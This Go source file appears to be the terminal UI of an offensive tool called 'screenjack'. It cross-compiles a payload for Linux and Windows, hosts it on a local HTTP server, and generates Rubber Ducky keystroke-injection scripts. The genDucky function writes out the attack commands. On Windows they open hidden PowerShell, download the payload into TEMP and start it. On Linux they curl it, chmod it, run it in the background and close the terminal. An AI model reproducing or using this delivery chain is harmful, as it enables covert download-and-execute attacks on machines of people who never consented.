package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/charmbracelet/bubbles/filepicker"
	"github.com/charmbracelet/bubbles/help"
	"github.com/charmbracelet/bubbles/key"
	"github.com/charmbracelet/bubbles/list"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// Tab represents a main navigation tab
type Tab int

const (
	TabBuild Tab = iota
	TabDucky
	TabServer
)

func (t Tab) String() string {
	return []string{"Build", "Ducky", "Server"}[t]
}

// KeyMap defines all keybindings
type KeyMap struct {
	Quit      key.Binding
	Help      key.Binding
	Tab       key.Binding
	ShiftTab  key.Binding
	Up        key.Binding
	Down      key.Binding
	Select    key.Binding
	Build     key.Binding
	Assets    key.Binding
	Generate  key.Binding
	Server    key.Binding
	Logs      key.Binding
	Back      key.Binding
	SelectAll key.Binding
}

func DefaultKeyMap() KeyMap {
	return KeyMap{
		Quit:      key.NewBinding(key.WithKeys("q", "ctrl+c"), key.WithHelp("q", "quit")),
		Help:      key.NewBinding(key.WithKeys("?"), key.WithHelp("?", "help")),
		Tab:       key.NewBinding(key.WithKeys("tab"), key.WithHelp("tab", "next tab")),
		ShiftTab:  key.NewBinding(key.WithKeys("shift+tab"), key.WithHelp("S-tab", "prev tab")),
		Up:        key.NewBinding(key.WithKeys("k", "up"), key.WithHelp("k/↑", "up")),
		Down:      key.NewBinding(key.WithKeys("j", "down"), key.WithHelp("j/↓", "down")),
		Select:    key.NewBinding(key.WithKeys("enter", " "), key.WithHelp("enter", "select")),
		Build:     key.NewBinding(key.WithKeys("b"), key.WithHelp("b", "build")),
		Assets:    key.NewBinding(key.WithKeys("a"), key.WithHelp("a", "assets")),
		Generate:  key.NewBinding(key.WithKeys("g"), key.WithHelp("g", "gen ducky")),
		Server:    key.NewBinding(key.WithKeys("h"), key.WithHelp("h", "toggle server")),
		Logs:      key.NewBinding(key.WithKeys("l"), key.WithHelp("l", "logs")),
		Back:      key.NewBinding(key.WithKeys("esc"), key.WithHelp("esc", "back")),
		SelectAll: key.NewBinding(key.WithKeys("A"), key.WithHelp("A", "select all")),
	}
}

func (k KeyMap) ShortHelp() []key.Binding {
	return []key.Binding{k.Help, k.Tab, k.Build, k.Assets, k.Server, k.Quit}
}

func (k KeyMap) FullHelp() [][]key.Binding {
	return [][]key.Binding{
		{k.Up, k.Down, k.Select, k.SelectAll},
		{k.Build, k.Assets, k.Generate},
		{k.Server, k.Logs, k.Back, k.Quit},
	}
}

// Modal types
type Modal int

const (
	ModalNone Modal = iota
	ModalAssets
	ModalFilePicker
	ModalLogs
	ModalPreview
)

// Styles
var (
	// Colors - amber/rust oxide palette
	colorRust     = lipgloss.Color("#D97706")
	colorAmber    = lipgloss.Color("#F59E0B")
	colorOrange   = lipgloss.Color("#EA580C")
	colorEmerald  = lipgloss.Color("#10B981")
	colorCyan     = lipgloss.Color("#06B6D4")
	colorRose     = lipgloss.Color("#F43F5E")
	colorStone50  = lipgloss.Color("#FAFAF9")
	colorStone400 = lipgloss.Color("#A8A29E")
	colorStone600 = lipgloss.Color("#57534E")
	colorStone800 = lipgloss.Color("#292524")

	styleTitle = lipgloss.NewStyle().
			Foreground(colorAmber).
			Bold(true)

	styleActiveTab = lipgloss.NewStyle().
			Foreground(colorAmber).
			Bold(true).
			Underline(true)

	styleInactiveTab = lipgloss.NewStyle().
				Foreground(colorStone400)

	styleBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(colorStone600).
			Padding(0, 1)

	styleActiveBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(colorRust).
			Padding(0, 1)

	styleStatus = lipgloss.NewStyle().
			Foreground(colorStone400).
			Padding(0, 1)

	styleSuccess = lipgloss.NewStyle().Foreground(colorEmerald)
	styleError   = lipgloss.NewStyle().Foreground(colorRose)
	styleWarn    = lipgloss.NewStyle().Foreground(colorOrange)

	styleModalOverlay = lipgloss.NewStyle().
				Border(lipgloss.DoubleBorder()).
				BorderForeground(colorAmber).
				Padding(1, 2)
)

// TargetItem implements list.Item for build targets
type TargetItem struct {
	Name     string
	Target   string
	Selected bool
}

func (t TargetItem) FilterValue() string { return t.Name }
func (t TargetItem) Title() string       { return t.Name }
func (t TargetItem) Description() string { return t.Target }

// AssetItem implements list.Item for assets
type AssetItem struct {
	Name     string
	Selected bool
}

func (a AssetItem) FilterValue() string { return a.Name }
func (a AssetItem) Title() string       { return a.Name }
func (a AssetItem) Description() string { return "" }

// TargetDelegate renders target items
type TargetDelegate struct{}

func (d TargetDelegate) Height() int                             { return 1 }
func (d TargetDelegate) Spacing() int                            { return 0 }
func (d TargetDelegate) Update(_ tea.Msg, _ *list.Model) tea.Cmd { return nil }

func (d TargetDelegate) Render(w io.Writer, m list.Model, index int, listItem list.Item) {
	item, ok := listItem.(TargetItem)
	if !ok {
		return
	}

	cursor := "  "
	if index == m.Index() {
		cursor = "> "
	}

	check := "[ ]"
	style := lipgloss.NewStyle()
	if item.Selected {
		check = "[x]"
		style = style.Foreground(colorCyan)
	}
	if index == m.Index() {
		style = style.Foreground(colorAmber).Bold(true)
		if item.Selected {
			style = style.Foreground(colorCyan).Background(colorStone800)
		}
	}

	fmt.Fprintf(w, "%s%s %s", cursor, check, style.Render(item.Name))
}

// AssetDelegate renders asset items
type AssetDelegate struct{}

func (d AssetDelegate) Height() int                             { return 1 }
func (d AssetDelegate) Spacing() int                            { return 0 }
func (d AssetDelegate) Update(_ tea.Msg, _ *list.Model) tea.Cmd { return nil }

func (d AssetDelegate) Render(w io.Writer, m list.Model, index int, listItem list.Item) {
	item, ok := listItem.(AssetItem)
	if !ok {
		return
	}

	cursor := "  "
	style := lipgloss.NewStyle()
	if index == m.Index() {
		cursor = "> "
		style = style.Foreground(colorAmber).Bold(true)
	}
	if item.Selected {
		cursor = "✓ "
		style = style.Foreground(colorCyan)
		if index == m.Index() {
			style = style.Background(colorStone800)
		}
	}

	fmt.Fprintf(w, "%s%s", cursor, style.Render(item.Name))
}

// TUIModel is the main model
type TUIModel struct {
	width, height int

	// Navigation
	activeTab Tab
	keys      KeyMap
	help      help.Model

	// Modal state
	modal Modal

	// Build tab
	targetList list.Model
	buildMsg   string
	buildLog   string

	// Assets
	assetList     list.Model
	selectedAsset string
	filePicker    filepicker.Model

	// Ducky tab
	duckyOS     string
	duckyURL    string
	payloadName string
	duckyMsg    string

	// Server tab
	server   *Server
	serverIP string
	httpLogs []LogEntry

	// Status
	status string
}

func NewTUIModel() TUIModel {
	// Target list
	targets := []list.Item{
		TargetItem{Name: "linux-x86_64", Target: "x86_64-unknown-linux-gnu", Selected: false},
		TargetItem{Name: "windows-x86_64", Target: "x86_64-pc-windows-gnu", Selected: false},
	}
	targetList := list.New(targets, TargetDelegate{}, 40, 6)
	targetList.SetShowTitle(false)
	targetList.SetShowStatusBar(false)
	targetList.SetShowHelp(false)
	targetList.SetFilteringEnabled(false)

	// Asset list (empty initially)
	assetList := list.New([]list.Item{}, AssetDelegate{}, 40, 10)
	assetList.SetShowTitle(false)
	assetList.SetShowStatusBar(false)
	assetList.SetShowHelp(false)
	assetList.SetFilteringEnabled(true)
	assetList.Title = "Assets"

	// File picker
	fp := filepicker.New()
	fp.AllowedTypes = []string{".gif", ".png", ".jpg", ".jpeg"}
	fp.CurrentDirectory, _ = os.UserHomeDir()
	fp.ShowHidden = false
	fp.Height = 15

	// Help
	h := help.New()
	h.ShowAll = false

	return TUIModel{
		activeTab:   TabBuild,
		keys:        DefaultKeyMap(),
		help:        h,
		targetList:  targetList,
		assetList:   assetList,
		filePicker:  fp,
		duckyOS:     "linux",
		duckyURL:    "http://localhost:8000",
		payloadName: "screenjack",
		server:      NewServer(),
		serverIP:    GetLocalIP(),
		status:      "Ready",
	}
}

func (m TUIModel) Init() tea.Cmd {
	return tea.Batch(
		scanAssetsCmd(),
		m.filePicker.Init(),
	)
}

// scanAssetsCmd scans the assets directory
func scanAssetsCmd() tea.Cmd {
	return func() tea.Msg {
		var assets []string
		entries, _ := os.ReadDir("../assets")
		for _, e := range entries {
			if !e.IsDir() {
				name := e.Name()
				ext := strings.ToLower(filepath.Ext(name))
				if ext == ".gif" || ext == ".png" || ext == ".jpg" || ext == ".jpeg" {
					assets = append(assets, name)
				}
			}
		}
		return assetsScannedMsg{assets: assets}
	}
}

type assetsScannedMsg struct{ assets []string }
type fileSelectedMsg struct{ path string }

func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd

	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width, m.height = msg.Width, msg.Height
		m.help.Width = msg.Width
		m.targetList.SetSize(msg.Width-4, 6)
		m.assetList.SetSize(msg.Width-8, min(15, msg.Height-10))
		m.filePicker.Height = min(20, msg.Height-10)
		return m, nil

	case assetsScannedMsg:
		items := make([]list.Item, len(msg.assets))
		for i, a := range msg.assets {
			items[i] = AssetItem{Name: a, Selected: a == m.selectedAsset}
		}
		m.assetList.SetItems(items)
		return m, nil

	case fileSelectedMsg:
		// Copy file to assets
		src := msg.path
		dst := "../assets/" + filepath.Base(src)
		if err := copyFile(src, dst); err != nil {
			m.status = styleError.Render("Error: " + err.Error())
		} else {
			m.status = styleSuccess.Render("Added " + filepath.Base(src))
			m.selectedAsset = filepath.Base(src)
		}
		m.modal = ModalNone
		return m, scanAssetsCmd()

	case buildDoneMsg:
		m.buildLog = msg.log
		if msg.ok {
			m.status = styleSuccess.Render(msg.msg)
		} else {
			m.status = styleError.Render(msg.msg)
		}
		return m, nil

	case tea.KeyMsg:
		// Modal handling
		if m.modal != ModalNone {
			return m.updateModal(msg)
		}

		// Global keys
		switch {
		case key.Matches(msg, m.keys.Quit):
			m.server.Stop()
			return m, tea.Quit

		case key.Matches(msg, m.keys.Help):
			m.help.ShowAll = !m.help.ShowAll
			return m, nil

		case key.Matches(msg, m.keys.Tab):
			m.activeTab = Tab((int(m.activeTab) + 1) % 3)
			return m, nil

		case key.Matches(msg, m.keys.ShiftTab):
			m.activeTab = Tab((int(m.activeTab) + 2) % 3)
			return m, nil

		case key.Matches(msg, m.keys.Assets):
			m.modal = ModalAssets
			return m, nil

		case key.Matches(msg, m.keys.Build):
			return m, m.buildTargets()

		case key.Matches(msg, m.keys.Server):
			return m, m.toggleServer()

		case key.Matches(msg, m.keys.Logs):
			if m.server.IsRunning() {
				m.modal = ModalLogs
			}
			return m, nil

		case key.Matches(msg, m.keys.Generate):
			m.genDucky()
			m.status = styleSuccess.Render("Ducky script saved")
			return m, nil
		}

		// Tab-specific updates
		switch m.activeTab {
		case TabBuild:
			return m.updateBuildTab(msg)
		case TabDucky:
			return m.updateDuckyTab(msg)
		case TabServer:
			return m.updateServerTab(msg)
		}
	}

	return m, tea.Batch(cmds...)
}

func (m TUIModel) updateModal(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch m.modal {
	case ModalAssets:
		switch {
		case key.Matches(msg, m.keys.Back):
			m.modal = ModalNone
			return m, nil
		case msg.String() == "n":
			// Open file picker
			m.modal = ModalFilePicker
			return m, m.filePicker.Init()
		case key.Matches(msg, m.keys.Select):
			// Select current asset
			if item, ok := m.assetList.SelectedItem().(AssetItem); ok {
				m.selectedAsset = item.Name
				// Update list to show selection
				items := m.assetList.Items()
				for i, it := range items {
					if a, ok := it.(AssetItem); ok {
						a.Selected = a.Name == m.selectedAsset
						items[i] = a
					}
				}
				m.assetList.SetItems(items)
			}
			return m, nil
		default:
			var cmd tea.Cmd
			m.assetList, cmd = m.assetList.Update(msg)
			return m, cmd
		}

	case ModalFilePicker:
		switch {
		case key.Matches(msg, m.keys.Back):
			m.modal = ModalAssets
			return m, nil
		default:
			var cmd tea.Cmd
			m.filePicker, cmd = m.filePicker.Update(msg)

			// Check if file was selected
			if didSelect, path := m.filePicker.DidSelectFile(msg); didSelect {
				return m, func() tea.Msg { return fileSelectedMsg{path: path} }
			}
			return m, cmd
		}

	case ModalLogs:
		if key.Matches(msg, m.keys.Back) || msg.String() == "l" {
			m.modal = ModalNone
		}
		return m, nil
	}

	return m, nil
}

func (m TUIModel) updateBuildTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch {
	case key.Matches(msg, m.keys.Select):
		// Toggle target selection
		if item, ok := m.targetList.SelectedItem().(TargetItem); ok {
			item.Selected = !item.Selected
			items := m.targetList.Items()
			items[m.targetList.Index()] = item
			m.targetList.SetItems(items)
		}
		return m, nil
	case key.Matches(msg, m.keys.SelectAll):
		items := m.targetList.Items()
		for i, it := range items {
			if t, ok := it.(TargetItem); ok {
				t.Selected = true
				items[i] = t
			}
		}
		m.targetList.SetItems(items)
		return m, nil
	default:
		var cmd tea.Cmd
		m.targetList, cmd = m.targetList.Update(msg)
		return m, cmd
	}
}

func (m TUIModel) updateDuckyTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch msg.String() {
	case "w":
		if m.duckyOS == "linux" {
			m.duckyOS = "windows"
		} else {
			m.duckyOS = "linux"
		}
	}
	return m, nil
}

func (m TUIModel) updateServerTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// Server tab specific keys if needed
	return m, nil
}

type buildDoneMsg struct {
	ok  bool
	msg string
	log string
}

func (m *TUIModel) buildTargets() tea.Cmd {
	return func() tea.Msg {
		var logs strings.Builder
		var out []string
		ok := true

		items := m.targetList.Items()
		for _, it := range items {
			t, isTarget := it.(TargetItem)
			if !isTarget || !t.Selected {
				continue
			}

			logs.WriteString(fmt.Sprintf("=== %s ===\n", t.Target))
			cmd := exec.Command("cargo", "build", "--release", "--target", t.Target)
			cmd.Dir = "../payload"
			output, err := cmd.CombinedOutput()
			logs.Write(output)
			logs.WriteString("\n")

			if err != nil {
				ok = false
				out = append(out, t.Name+":FAIL")
			} else {
				out = append(out, t.Name+":OK")
			}
		}

		if len(out) == 0 {
			return buildDoneMsg{false, "nothing selected", ""}
		}

		os.WriteFile("/tmp/screenjack-build.log", []byte(logs.String()), 0644)
		return buildDoneMsg{ok, strings.Join(out, " "), logs.String()}
	}
}

func (m *TUIModel) toggleServer() tea.Cmd {
	if m.server.IsRunning() {
		m.server.Stop()
		m.status = "Server stopped"
	} else {
		payloadPath, ok := PayloadExists(m.duckyOS)
		if !ok {
			m.status = styleError.Render("No payload built")
			return nil
		}
		assetPath := ""
		if m.selectedAsset != "" {
			assetPath = "../assets/" + m.selectedAsset
		}
		if err := m.server.Start(payloadPath, assetPath); err != nil {
			m.status = styleError.Render(err.Error())
		} else {
			m.status = styleSuccess.Render(fmt.Sprintf("Server running on :%d", m.server.Port()))
		}
	}
	return nil
}

func (m *TUIModel) genDucky() {
	var b strings.Builder

	baseURL := m.duckyURL
	if m.server.IsRunning() {
		baseURL = fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
	}
	url := strings.TrimSuffix(baseURL, "/") + "/" + m.payloadName

	b.WriteString(fmt.Sprintf("REM screenjack payload - target: %s\n", m.duckyOS))
	b.WriteString(fmt.Sprintf("REM url: %s\n", url))
	b.WriteString("REM exit: Ctrl+Shift+Escape (hold 2s)\n")
	b.WriteString("DELAY 500\n\n")

	if m.duckyOS == "windows" {
		b.WriteString("REM Open hidden PowerShell\n")
		b.WriteString("GUI r\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING powershell -w hidden\n")
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download and execute\n")
		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s.exe\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p\n",
			url, m.payloadName))
		b.WriteString("ENTER\n")
	} else {
		b.WriteString("REM Open terminal\n")
		b.WriteString("CTRL-ALT t\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download, chmod, execute in background\n")
		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s &\n", url, m.payloadName, m.payloadName))
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING exit\n")
		b.WriteString("ENTER\n")
	}

	os.MkdirAll("../ducky", 0755)
	os.WriteFile("../ducky/payload_"+m.duckyOS+".txt", []byte(b.String()), 0644)
}

func (m TUIModel) View() string {
	if m.width < 40 || m.height < 15 {
		return "Terminal too small"
	}

	// Render modal if active
	if m.modal != ModalNone {
		return m.viewModal()
	}

	var b strings.Builder

	// Header with tabs
	b.WriteString(m.viewTabs())
	b.WriteString("\n\n")

	// Main content based on active tab
	switch m.activeTab {
	case TabBuild:
		b.WriteString(m.viewBuildTab())
	case TabDucky:
		b.WriteString(m.viewDuckyTab())
	case TabServer:
		b.WriteString(m.viewServerTab())
	}

	// Footer
	b.WriteString("\n")
	b.WriteString(styleStatus.Render(m.status))
	b.WriteString("\n")
	b.WriteString(m.help.View(m.keys))

	// Center horizontally
	content := b.String()
	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Top, content)
}

func (m TUIModel) viewTabs() string {
	var tabs []string
	for i := Tab(0); i <= TabServer; i++ {
		style := styleInactiveTab
		if i == m.activeTab {
			style = styleActiveTab
		}
		tabs = append(tabs, style.Render(i.String()))
	}

	title := styleTitle.Render("screenjack")
	tabLine := strings.Join(tabs, "  ")

	return fmt.Sprintf("  %s    %s", tabLine, title)
}

func (m TUIModel) viewBuildTab() string {
	var b strings.Builder

	b.WriteString("  Targets\n")
	b.WriteString("  ───────\n")
	b.WriteString(m.targetList.View())
	b.WriteString("\n\n")

	asset := m.selectedAsset
	if asset == "" {
		asset = "(none)"
	}
	b.WriteString(fmt.Sprintf("  Asset: %s\n", styleSuccess.Render(asset)))

	return b.String()
}

func (m TUIModel) viewDuckyTab() string {
	var b strings.Builder

	b.WriteString("  Ducky Script Generator\n")
	b.WriteString("  ──────────────────────\n\n")
	b.WriteString(fmt.Sprintf("  Target OS: %s  (w to toggle)\n", styleSuccess.Render(m.duckyOS)))
	b.WriteString(fmt.Sprintf("  URL: %s\n", m.duckyURL))
	b.WriteString(fmt.Sprintf("  Payload: %s\n", m.payloadName))

	return b.String()
}

func (m TUIModel) viewServerTab() string {
	var b strings.Builder

	b.WriteString("  HTTP Server\n")
	b.WriteString("  ───────────\n\n")

	status := styleError.Render("Stopped")
	if m.server.IsRunning() {
		status = styleSuccess.Render(fmt.Sprintf("Running on %s:%d", m.serverIP, m.server.Port()))
	}
	b.WriteString(fmt.Sprintf("  Status: %s\n", status))

	if m.server.IsRunning() {
		logs := m.server.Logs()
		if len(logs) > 0 {
			b.WriteString(fmt.Sprintf("\n  Recent requests: %d\n", len(logs)))
		}
	}

	return b.String()
}

func (m TUIModel) viewModal() string {
	var content string
	var title string

	switch m.modal {
	case ModalAssets:
		title = "Assets"
		content = m.assetList.View()
		content += "\n\n[n] add new  [enter] select  [esc] close"

	case ModalFilePicker:
		title = "Select File"
		content = m.filePicker.View()

	case ModalLogs:
		title = "HTTP Logs"
		logs := m.server.Logs()
		var lines []string
		for _, l := range logs {
			lines = append(lines, fmt.Sprintf("%s %s %s %d",
				l.Time.Format("15:04:05"), l.Method, l.Path, l.Status))
		}
		if len(lines) == 0 {
			content = "(no requests yet)"
		} else {
			content = strings.Join(lines, "\n")
		}
		content += "\n\n[esc] close"
	}

	modal := styleModalOverlay.Width(m.width - 10).Render(
		styleTitle.Render(title) + "\n\n" + content,
	)

	// Center the modal
	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, modal)
}
